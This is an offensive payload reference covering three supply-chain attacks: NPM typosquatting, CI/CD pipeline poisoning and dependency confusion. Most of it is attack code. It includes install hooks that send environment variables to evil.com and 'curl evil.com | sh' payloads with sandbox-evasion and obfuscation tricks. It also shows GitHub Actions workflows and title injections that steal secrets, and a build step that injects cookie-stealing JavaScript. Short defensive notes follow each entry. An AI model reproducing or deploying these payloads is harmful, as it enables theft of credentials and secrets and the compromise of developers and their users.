# Supply Chain Attacks

_3 web payloads_

### NPM Package Name Typosquatting  `supply-typosquat`
_Register malicious packages with names highly similar to popular NPM packages (e.g. lodash→1odash, colors→co1ors) to trick developers into installing them by mistake. The malicious package executes a reverse shell, steals environment variables, or plants a backdoor in the install/postinstall hooks._
Subcategory: **Package Manager Poisoning** · tags: `Supply Chain` `NPM` `Typosquatting` `Package Poisoning` `postinstall`

**Prerequisites:**
- NPM account
- Knowledge of the target project's dependencies
- Malicious package infrastructure

**Attack Chain:**

**1. Recon target dependencies**
> Identify popular NPM packages used by the target project as typosquatting targets
```
# Analyze the target project's package.json
curl -s "https://raw.githubusercontent.com/{ORG}/{REPO}/main/package.json" | jq '.dependencies, .devDependencies'

# Query high-download packages
npm search lodash --json | jq '.[0:5] | .[] | {name, description, version}'
```
**Syntax breakdown:**
- `raw.githubusercontent.com` — GitHub Raw file API reads source directly _domain_
- `.dependencies, .devDependencies` — jq extracts the production and dev dependency lists _function_
- `npm search` — searches package info in the NPM registry _command_

**2. Generate squatted package names**
> Generate multiple variants similar to the target package name and check their availability
```
# Common typosquatting variant generation
original="lodash"
echo "${original}" | python3 -c "
import sys
name=sys.stdin.read().strip()
# Character substitution: l->1, o->0
print(name.replace('l','1'))
# Hyphenated variants
print(name+'-utils')
print(name+'-js')
# Missing/extra characters
print(name[:-1])
print(name+'s')
"

# Check NPM availability
for pkg in 1odash lodash-utils lodash-js lodas lodashs; do
  npm view $pkg 2>/dev/null && echo "$pkg: TAKEN" || echo "$pkg: AVAILABLE"
done
```
**Syntax breakdown:**
- `replace('l','1')` — visual character substitution — replace l with the digit 1 _technique_
- `npm view` — checks whether a package is already registered _command_
- `2>/dev/null` — hides 404 error output _operator_

**3. Build the malicious package**
> Create a malicious NPM package disguised as a legitimate utility library, using install hooks to execute malicious code
```
# Plant a postinstall hook in package.json
{
  "name": "1odash",
  "version": "1.0.0",
  "description": "Utility library for JavaScript",
  "scripts": {
    "preinstall": "node scripts/setup.js",
    "postinstall": "node scripts/telemetry.js"
  }
}

# scripts/telemetry.js — steal environment variables
const https = require('https');
const data = JSON.stringify({
  env: process.env,
  cwd: process.cwd(),
  hostname: require('os').hostname()
});
https.request({hostname:'evil.com',path:'/collect',method:'POST',headers:{'Content-Type':'application/json'}}, ()=>{}).end(data);
```
**Syntax breakdown:**
- `postinstall` — NPM lifecycle hook, runs automatically after install completes _keyword_
- `process.env` — Node.js environment variable object, may contain API keys _variable_
- `os.hostname()` — obtains the hostname to identify the victim target _function_

**4. Detection and forensics**
> Audit the current project's dependency security, identifying suspicious install hooks and anomalous packages
```
# Audit project dependency security
npm audit --json | jq '.vulnerabilities | to_entries[] | {name: .key, severity: .value.severity}'

# Check for postinstall hooks
find node_modules -name "package.json" -exec grep -l "postinstall\|preinstall" {} \;

# Compare lock file integrity
npm ci --dry-run 2>&1 | grep -i "warn\|error"

# Socket.dev malicious package detection
npx socket info lodash
```
**Syntax breakdown:**
- `npm audit` — official dependency security auditing tool _command_
- `postinstall\|preinstall` — searches for dangerous lifecycle hooks _technique_
- `npm ci --dry-run` — simulates install to check lock file consistency _command_

**WAF/EDR Bypass Variants:**

**Bypassing NPM package security detection**
> Use delayed execution, code obfuscation, and environment detection to bypass automated security scanning
```
# Delayed execution to evade sandbox detection
setTimeout(() => {
  // Malicious code runs after 30 seconds, bypassing automated analysis timeouts
  require('child_process').exec('curl evil.com/c | sh')
}, 30000);

# Code obfuscation
const _0x4f2a=['\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
require(_0x4f2a[0]).exec('...');

# Environment detection — only trigger in CI/CD
if(process.env.CI || process.env.GITHUB_ACTIONS) {
  // Only attack CI/CD environments
}
```
**Syntax breakdown:**
- `setTimeout(..., 30000)` — delays execution 30 seconds to bypass sandbox timeouts _technique_
- `\x63\x68\x69\x6c\x64` — hex-encoded child_process string _encoding_
- `process.env.CI` — detects the CI environment variable to target automation pipelines _variable_

**Overview:** Typosquatting is one of the most common supply chain attack techniques. Attackers register malicious packages in package managers such as NPM/PyPI with names highly similar to popular packages, exploiting developer typos during installation. The 2022 ua-parser-js incident and the colors/faker poisoning incidents both caused widespread impact, demonstrating the severity of this attack surface.

**Vulnerability Principle:** Root causes: (1) the NPM registry does not restrict registration of names similar to existing packages (it only requires the exact package name not to be duplicated); (2) developers manually typing package names in the terminal easily make typos; (3) lifecycle hooks such as postinstall run automatically on install with no sandbox isolation; (4) most developers do not audit the code in node_modules; (5) CI/CD pipelines typically run npm install with high privileges.

**Exploitation Method:** Attack chain: (1) select a high-download target package and generate multiple typosquatting variants; (2) create a malicious package that replicates the original at the functional level to avoid detection; (3) inject malicious code into the preinstall/postinstall hooks (steal environment variables/SSH keys/install a backdoor); (4) publish to NPM and wait for victims to install; (5) collect stolen credentials via a C2 server; (6) use the obtained CI/CD credentials to further compromise the supply chain.

**Defensive Measures:** Defenses: (1) use the --ignore-scripts flag to disable install hooks: npm install --ignore-scripts; (2) enable npm audit and third-party security scanners such as Snyk/Socket.dev; (3) use package-lock.json to lock versions and use npm ci in CI; (4) configure scope restrictions and a private registry in .npmrc; (5) enforce least privilege: do not expose unnecessary environment variables in the CI/CD environment; (6) use npm config set ignore-scripts true to disable hooks globally.

---

### CI/CD Pipeline Poisoning  `supply-ci-poison`
_Attack the CI/CD pipeline via malicious Pull Requests, Actions injection, or build script tampering. An attacker can steal build secrets, poison build artifacts, or plant backdoor code in the deployment flow._
Subcategory: **CI/CD Attacks** · tags: `Supply Chain` `CI/CD` `GitHub Actions` `Jenkins` `Pipeline`

**Prerequisites:**
- Target uses public CI/CD
- Ability to submit a PR or fork

**Attack Chain:**

**1. Identify CI/CD configuration**
> Analyze the target project's CI/CD configuration files and secret usage
```
# Search GitHub Actions configuration
curl -s "https://api.github.com/repos/{ORG}/{REPO}/contents/.github/workflows" \
  -H "Authorization: token {GITHUB_TOKEN}" | jq '.[].name'

# Analyze secret usage in workflows
curl -s "https://raw.githubusercontent.com/{ORG}/{REPO}/main/.github/workflows/ci.yml" | grep -E "secrets\.|\$\{\{.*\}\}"
```
**Syntax breakdown:**
- `.github/workflows` — GitHub Actions configuration directory _path_
- `secrets\.` — searches for GitHub Secrets references _technique_
- `\$\{\{.*\}\}` — GitHub Actions expression syntax _format_

**2. PR-triggered workflow injection**
> Exploit the pull_request_target event to execute PR code in the base repo context and steal Secrets
```
# Malicious .github/workflows/pr-check.yml
name: PR Check
on:
  pull_request_target:  # Dangerous: executes in the base repo context
    types: [opened, synchronize]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: |
          # Code from the PR executes with base repo privileges
          echo ${{ secrets.DEPLOY_KEY }} | base64 -w0
          curl -X POST -d @<(env) https://evil.com/collect
```
**Syntax breakdown:**
- `pull_request_target` — triggers in the base repo (not fork) context, can access Secrets _keyword_
- `${{ secrets.DEPLOY_KEY }}` — GitHub Actions Secrets expression injection _variable_
- `github.event.pull_request.head.sha` — references the PR code — this is the malicious payload source _variable_

**3. Actions expression injection**
> Inject commands into GitHub Actions run steps via PR titles/issue comments
```
# PR title injection
# Create a PR with a title of:
# test`curl evil.com/s|sh`

# Vulnerable if the workflow is written like this:
run: echo "Checking PR: ${{ github.event.pull_request.title }}"

# Issue comment injection
# Comment content:
# "); curl evil.com/steal?token=$GITHUB_TOKEN #

# Search for injection points
grep -rn '\${{.*github\.event\.' .github/workflows/
```
**Syntax breakdown:**
- `${{ github.event.pull_request.title }}` — unsafe expression interpolation — the PR title is spliced directly into the shell command _variable_
- `GITHUB_TOKEN` — the temporary token automatically injected by Actions _variable_
- `github.event` — user-controllable data in the event payload _keyword_

**4. Build artifact poisoning**
> Inject malicious code (such as a cookie-stealing script) into artifacts during the build process
```
# Tamper with the build script to inject a backdoor
# Modify the package.json build script
"scripts": {
  "build": "react-scripts build && node inject.js"
}

# inject.js — inject code into build artifacts
const fs = require('fs');
const buildDir = './build/static/js';
fs.readdirSync(buildDir).filter(f=>f.endsWith('.js')).forEach(f => {
  let code = fs.readFileSync(`${buildDir}/${f}`, 'utf8');
  code += '\n;fetch("https://evil.com/log?c="+document.cookie);';
  fs.writeFileSync(`${buildDir}/${f}`, code);
});
```
**Syntax breakdown:**
- `react-scripts build && node inject.js` — appends malicious script execution after the normal build _command_
- `document.cookie` — the injected code steals the user's cookies _function_

**WAF/EDR Bypass Variants:**

**Bypassing GitHub Actions security restrictions**
> Use indirect triggers, third-party Actions, and Python exfiltration to bypass log auditing and security policies
```
# Use workflow_dispatch for indirect triggering
# Avoids exposing malicious code directly in a PR
on:
  workflow_dispatch:
    inputs:
      cmd:
        description: "Command"
        required: true
steps:
  - run: ${{ github.event.inputs.cmd }}

# Use a third-party Action as a pivot
- uses: malicious-org/innocent-name@main
  # The malicious Action steals secrets internally

# Environment variable leakage — avoid direct echo
- run: |
    python3 -c "import os,urllib.request;urllib.request.urlopen(urllib.request.Request('https://evil.com',data=str(dict(os.environ)).encode()))"
```
**Syntax breakdown:**
- `workflow_dispatch` — manually triggers a workflow, parameters are controllable _keyword_
- `${{ github.event.inputs.cmd }}` — injects a command from manual input _variable_
- `urllib.request.urlopen` — uses Python to exfiltrate data, avoiding bash log recording _function_

**Overview:** CI/CD pipeline poisoning is the highest-impact technique in supply chain attacks. Automation systems such as GitHub Actions, Jenkins, and GitLab CI typically hold high-value Secrets like deploy keys and cloud credentials. In the 2021 Codecov incident, attackers stole environment variables from thousands of enterprises by tampering with a CI script. pull_request_target and expression injection are the most common attack surfaces in GitHub Actions.

**Vulnerability Principle:** Root causes: (1) the pull_request_target event executes fork code in the base repo context and can access Secrets; (2) GitHub Actions ${{}} expressions unsafely insert user input (PR titles/issue comments) into shell commands; (3) developers lack auditing of third-party Actions — a malicious Action can steal all Secrets; (4) build logs may leak secrets (even if masked, they can be bypassed via encoding); (5) CI environments typically run with root privileges and unrestricted networking.

**Exploitation Method:** Attack chain: (1) search the target repo's .github/workflows directory to analyze workflow configuration; (2) identify workflows using pull_request_target — these can be PR-triggered and have Secrets access; (3) craft a malicious PR to obtain base repo Secrets via the checkout step; (4) if pull_request_target is not present, attempt expression injection (via PR title/body); (5) use the obtained Secrets to further attack deployment targets (e.g. AWS keys → cloud service takeover).

**Defensive Measures:** Defenses: (1) avoid using pull_request_target; if it must be used, do not checkout PR code; (2) pass all user input via environment variables instead of interpolating directly in ${{}}; (3) pin third-party Actions to a specific SHA rather than a tag (e.g. actions/checkout@a1b2c3d); (4) enable GitHub's Required Reviewers to block unreviewed workflow changes; (5) use OpenSSF Scorecard to assess project CI security; (6) least privilege: configure minimal necessary permissions for GITHUB_TOKEN.

---

### Dependency Confusion Attack  `supply-dependency-confusion`
_Exploit the resolution priority flaw between public and private registries in package managers. When an enterprise uses internal package names, an attacker registers a same-named package with a higher version number on the public NPM/PyPI, and the package manager preferentially installs the public higher-version package, thereby executing malicious code._
Subcategory: **Dependency Confusion** · tags: `Supply Chain` `Dependency Confusion` `NPM` `PyPI` `Dependency Confusion`

**Prerequisites:**
- Known target internal package name
- Public registry account

**Attack Chain:**

**1. Discover internal package names**
> Discover the internal package names used by the target from frontend code, leaked lock files, and error messages
```
# Extract import paths from JavaScript source
curl -s "https://{TARGET}/static/js/main.js" | grep -oP "require\([\x27\x22]@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+[\x27\x22]\)" | sort -u

# Search leaked package-lock.json
curl -s "https://{TARGET}/package-lock.json" 2>/dev/null | jq 'keys' 

# GitHub search for private package names
# Search: "@internal-company/" site:github.com

# Discover from error pages/source comments
curl -s "https://{TARGET}" | grep -oE "@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+"
```
**Syntax breakdown:**
- `@[a-zA-Z0-9_-]+/` — matches the NPM scoped package format _technique_
- `package-lock.json` — may leak internal dependency information _path_
- `require(...)` — extracts module references from JS source _function_

**2. Register a same-named package on the public registry**
> Publish a package on the NPM public registry with the same name as the target's internal package but a higher version number
```
# Create a public package with the same name as the internal package
mkdir dependency-confusion-test && cd dependency-confusion-test
npm init -y
# Set an extremely high version number
npm version 99.0.0

# Add harmless detection code (non-malicious)
cat > index.js << 'EOF'
const os = require("os");
const dns = require("dns");
const pkg = require("./package.json");
// DNS callback only to confirm installation — no data exfiltration
dns.resolve(`${pkg.name}.${os.hostname()}.dep-test.example.com`, ()=>{});
EOF

npm publish --access public
```
**Syntax breakdown:**
- `npm version 99.0.0` — set an extremely high version number to ensure it is resolved preferentially _command_
- `dns.resolve` — confirms the package was installed via a DNS query (OOB) _function_
- `--access public` — publish as a public package _parameter_

**3. Monitor DNS callbacks to confirm a hit**
> Monitor DNS/HTTP callbacks to confirm the target environment installed the malicious package from the public registry
```
# Monitor using Burp Collaborator or a self-hosted DNS server
# Interactsh monitoring
interactsh-client -v 2>&1 | grep "dep-test"

# Self-hosted DNS records
sudo tcpdump -i eth0 port 53 -l | grep "dep-test"

# Can also use HTTP callbacks
python3 -m http.server 8080 &
# Wait for the target CI/CD pipeline to install the package and trigger the callback
```
**Syntax breakdown:**
- `interactsh-client` — ProjectDiscovery's OOB interaction tool _command_
- `tcpdump -i eth0 port 53` — captures DNS query traffic _command_

**4. Impact assessment and reporting**
> Verify the package manager's resolution priority behavior and assess the scope of impact
```
# Verify the affected package manager behavior
# NPM: defaults to preferring the public higher version
npm install @target-corp/utils --registry https://registry.npmjs.org -dd 2>&1 | grep "resolved"

# Python/pip works the same way
pip install target-corp-utils --index-url https://pypi.org/simple/ -v 2>&1 | grep "Downloading"

# Check whether a registry scope is configured
npm config get @target-corp:registry
```
**Syntax breakdown:**
- `--registry` — specifies the package registry address _parameter_
- `-dd` — NPM verbose debug output _parameter_
- `@target-corp:registry` — NPM scoped registry configuration _variable_

**WAF/EDR Bypass Variants:**

**Bypassing package name registration restrictions**
> Use unscoped package names, cross-package-manager attacks, and prerelease versions to expand the attack surface
```
# If the target uses unscoped package names
# Directly register a same-named public package (no @scope prefix makes confusion easier)

# Cross-package-manager attack
# Target uses NPM but also try PyPI
pip install target-internal-lib  # pip has no scope concept

# Use a prerelease tag
npm version 99.0.0-alpha.1
# Some configurations will match >=1.0.0 ranges including prerelease
```
**Syntax breakdown:**
- `unscoped` — package names without the @scope prefix are more prone to confusion _concept_
- `99.0.0-alpha.1` — a prerelease tag may match loose version ranges _value_

**Overview:** Dependency Confusion was discovered and disclosed by security researcher Alex Birsan in 2021, affecting tech giants such as Apple, Microsoft, and PayPal. The attack exploits the behavior of package managers (NPM/PyPI/RubyGems) preferring the higher version from the public registry when resolving same-named packages. An attacker only needs to know the target's internal package name to publish a same-named higher-version malicious package on the public registry and wait for a hit.

**Vulnerability Principle:** Root causes: (1) package managers such as NPM query both the public and private registries by default and prefer the higher version number; (2) many enterprises do not correctly configure the registry scope mapping in .npmrc; (3) internal package names can be discovered via leaked lock files, JS source, GitHub search, error messages, etc.; (4) CI/CD pipelines typically run npm install automatically and have network access; (5) using loose version ranges (e.g. ^1.0.0) in package.json makes it easier to hit the higher-version attack package.

**Exploitation Method:** Attack flow: (1) discover the target's internal package names via JS source, lock file leaks, GitHub search, etc.; (2) confirm the package name is not registered on the NPM public registry; (3) create a same-named public package with the version number set to 99.x.x; (4) embed DNS/HTTP callback code in the package (used to confirm a hit, does not perform destruction); (5) wait for the target CI/CD pipeline or a developer to run npm install and trigger installation; (6) confirm the attack succeeded via the DNS/HTTP callback and collect target environment information.

**Defensive Measures:** Remediation: (1) configure the scope in .npmrc to point to the private registry: @company:registry=https://private.registry.com; (2) register all internal package names in the private registry (even if only used in the private environment); (3) use npm's --prefer-offline and package-lock.json to lock versions; (4) enable npm audit and Dependabot to detect anomalous dependency changes; (5) disable public registry access in the CI/CD pipeline or use a proxy; (6) use tools such as Artifactory to configure a virtual repository that unifies package resolution policy.

---
